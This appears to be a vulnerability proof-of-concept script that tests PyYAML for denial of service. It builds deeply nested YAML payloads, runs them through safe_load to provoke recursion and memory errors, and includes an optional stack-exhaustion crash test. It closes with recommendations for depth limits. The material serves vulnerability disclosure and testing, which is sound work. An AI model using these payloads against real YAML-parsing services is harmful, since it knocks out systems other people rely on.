#!/usr/bin/env python3
"""
VULN-005: Memory Exhaustion via Deep Recursion
Severity: HIGH
Type: Denial of Service (Stack Overflow / Memory Exhaustion)

This vulnerability allows attackers to crash PyYAML or cause memory
exhaustion through deeply nested YAML structures.
"""

import sys
import os
import resource

# Add the lib directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib'))

import yaml


def test_deep_nesting_sequences():
    """
    Test deep nesting with sequences (lists).
    """

    print("=" * 60)
    print("VULN-005: Deep Recursion Attack (Sequences)")
    print("=" * 60)
    print()

    # Python's default recursion limit is 1000
    # We'll try various depths

    for depth in [100, 500, 1000, 2000, 5000]:
        # Create deeply nested sequence: [[[[...]]]]]
        payload = "[" * depth + "]" * depth

        print(f"Testing depth {depth}:")
        print(f"  Payload length: {len(payload)}")

        try:
            result = yaml.safe_load(payload)

            # Count actual depth
            actual_depth = 0
            obj = result
            while isinstance(obj, list) and len(obj) > 0:
                actual_depth += 1
                obj = obj[0]

            print(f"  [*] SUCCESS - Depth achieved: {actual_depth}")

        except RecursionError as e:
            print(f"  [!] RecursionError at depth {depth}")
            print(f"      {str(e)[:60]}")

        except MemoryError:
            print(f"  [!] MemoryError at depth {depth}")

        except yaml.YAMLError as e:
            print(f"  [x] YAMLError: {str(e)[:60]}")

        except Exception as e:
            print(f"  [x] {type(e).__name__}: {str(e)[:60]}")

        print()


def test_deep_nesting_mappings():
    """
    Test deep nesting with mappings (dicts).
    """

    print("-" * 60)
    print("Deep Recursion Attack (Mappings)")
    print("-" * 60)
    print()

    for depth in [100, 500, 1000, 2000]:
        # Create deeply nested mapping: {a: {a: {a: ...}}}
        payload = "a: " * depth + "x"

        print(f"Testing depth {depth}:")
        print(f"  Payload length: {len(payload)}")

        try:
            result = yaml.safe_load(payload)

            # Count actual depth
            actual_depth = 0
            obj = result
            while isinstance(obj, dict) and 'a' in obj:
                actual_depth += 1
                obj = obj['a']

            print(f"  [*] SUCCESS - Depth achieved: {actual_depth}")

        except RecursionError as e:
            print(f"  [!] RecursionError at depth {depth}")

        except Exception as e:
            print(f"  [x] {type(e).__name__}: {str(e)[:60]}")

        print()


def test_deep_flow_nesting():
    """
    Test deep nesting with flow-style YAML.
    """

    print("-" * 60)
    print("Deep Recursion Attack (Flow Style)")
    print("-" * 60)
    print()

    for depth in [100, 500, 1000, 2000]:
        # Create deeply nested flow mapping: {{{{...}}}}
        payload = "{a: " * depth + "x" + "}" * depth

        print(f"Testing flow mapping depth {depth}:")
        print(f"  Payload length: {len(payload)}")

        try:
            result = yaml.safe_load(payload)
            print(f"  [*] SUCCESS")

        except RecursionError:
            print(f"  [!] RecursionError at depth {depth}")

        except Exception as e:
            print(f"  [x] {type(e).__name__}: {str(e)[:60]}")

        print()


def test_mixed_deep_nesting():
    """
    Test deep nesting with mixed types.
    """

    print("-" * 60)
    print("Deep Recursion Attack (Mixed Types)")
    print("-" * 60)
    print()

    for depth in [100, 500, 1000]:
        # Alternate between lists and dicts
        parts = []
        for i in range(depth):
            if i % 2 == 0:
                parts.append("- ")
            else:
                parts.append("a:\n" + "  " * (i // 2 + 1))
        payload = "".join(parts) + "x"

        print(f"Testing mixed nesting depth {depth}:")
        print(f"  Payload length: {len(payload)}")

        try:
            result = yaml.safe_load(payload)
            print(f"  [*] SUCCESS")

        except RecursionError:
            print(f"  [!] RecursionError at depth {depth}")

        except Exception as e:
            print(f"  [x] {type(e).__name__}: {str(e)[:40]}")

        print()


def test_recursion_limit_bypass():
    """
    Test if YAML parsing can bypass Python's recursion limit.
    """

    print("-" * 60)
    print("Testing Recursion Limit Bypass")
    print("-" * 60)
    print()

    original_limit = sys.getrecursionlimit()
    print(f"Original recursion limit: {original_limit}")

    # Try setting a lower limit
    sys.setrecursionlimit(500)
    print(f"Set recursion limit to: 500")

    depth = 600
    payload = "[" * depth + "]" * depth

    print(f"Testing nesting depth {depth} (exceeds limit):")

    try:
        result = yaml.safe_load(payload)
        print(f"  [!] VULNERABILITY: Parsed despite recursion limit!")

    except RecursionError:
        print(f"  [*] RecursionError raised as expected")

    except Exception as e:
        print(f"  [x] {type(e).__name__}: {e}")

    # Restore original limit
    sys.setrecursionlimit(original_limit)
    print()


def test_stack_exhaustion():
    """
    Test for actual stack exhaustion (crash).
    """

    print("-" * 60)
    print("Stack Exhaustion Test (Careful!)")
    print("-" * 60)
    print()

    # This test intentionally tries to crash the process
    # We'll limit stack size to make this safer

    try:
        # Get current stack size limit
        soft, hard = resource.getrlimit(resource.RLIMIT_STACK)
        print(f"Stack limit: soft={soft}, hard={hard}")

        # Set a smaller stack limit (8MB)
        resource.setrlimit(resource.RLIMIT_STACK, (8 * 1024 * 1024, hard))
        print("Set stack limit to 8MB")

        # Increase recursion limit to allow deeper recursion
        sys.setrecursionlimit(50000)
        print("Set recursion limit to 50000")

        depth = 40000
        payload = "[" * depth + "]" * depth

        print(f"Testing extreme depth {depth}...")
        print("WARNING: This may crash the process!")
        print()

        result = yaml.safe_load(payload)
        print(f"  [!] Survived depth {depth}")

    except RecursionError:
        print(f"  [*] RecursionError at extreme depth")

    except MemoryError:
        print(f"  [!] MemoryError - stack exhausted!")

    except SystemError as e:
        print(f"  [!] SystemError - likely stack overflow: {e}")

    except Exception as e:
        print(f"  [x] {type(e).__name__}: {e}")

    finally:
        # Restore defaults
        sys.setrecursionlimit(1000)
        try:
            resource.setrlimit(resource.RLIMIT_STACK, (soft, hard))
        except:
            pass

    print()


def generate_recursive_payload(depth, style='block'):
    """
    Generate a recursive YAML payload.

    Args:
        depth: Nesting depth
        style: 'block' for indented, 'flow' for inline

    Returns:
        str: YAML payload
    """
    if style == 'flow':
        return "[" * depth + "]" * depth
    else:
        lines = []
        for i in range(depth):
            lines.append("  " * i + "- ")
        lines.append("  " * depth + "end")
        return "\n".join(lines)


if __name__ == '__main__':
    print("PyYAML Deep Recursion Attack Test Suite")
    print("=" * 60)
    print()
    print("This test suite demonstrates denial-of-service attacks")
    print("through deeply nested YAML structures.")
    print()
    print("These attacks can cause:")
    print("  - RecursionError exceptions")
    print("  - MemoryError exceptions")
    print("  - Process crashes (stack overflow)")
    print()

    test_deep_nesting_sequences()
    test_deep_nesting_mappings()
    test_deep_flow_nesting()
    test_mixed_deep_nesting()
    test_recursion_limit_bypass()

    # Uncomment to run dangerous stack exhaustion test
    # test_stack_exhaustion()

    print("=" * 60)
    print("CONCLUSION")
    print("=" * 60)
    print()
    print("PyYAML has NO built-in protection against deep recursion!")
    print()
    print("An attacker can:")
    print("  - Crash the Python process with RecursionError")
    print("  - Exhaust memory with deeply nested structures")
    print("  - Potentially cause stack buffer overflow")
    print()
    print("RECOMMENDATION:")
    print("  - Implement depth limits in the parser")
    print("  - Add configuration option for max nesting depth")
    print("  - Fail fast when depth exceeds safe limits")
    print("=" * 60)
